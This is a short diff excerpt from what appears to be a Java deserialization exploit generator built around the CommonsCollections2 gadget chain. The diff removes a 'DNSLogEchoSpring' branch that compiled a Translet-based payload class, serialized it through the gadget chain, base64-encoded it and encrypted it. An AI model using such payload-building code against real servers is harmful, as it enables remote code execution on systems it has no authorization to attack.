@@ -154,22 +154,6 @@ public class CommonsCollections2 {
             String data = Base64.getEncoder().encodeToString(payload);
             return Tools.CBC_Encrypt(key, data);
 
-        } else if (echoType.equals("DNSLogEchoSpring")) {
-            // DNSLog 探测（Spring 版本）
-            DNSLogEchoSpring dnsLogEchoSpring = new DNSLogEchoSpring();
-            ctClass = dnsLogEchoSpring.genPayload(pool);
-
-            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
-                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
-            } else {
-                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
-            }
-            ctClass.setSuperclass(superClass);
-
-            byte[] payload = new CommonsCollections2().getPayload(ctClass.toBytecode());
-            String data = Base64.getEncoder().encodeToString(payload);
-            return Tools.CBC_Encrypt(key, data);
-
         } else {
             throw new Exception("不支持的回显类型: " + echoType);
         }
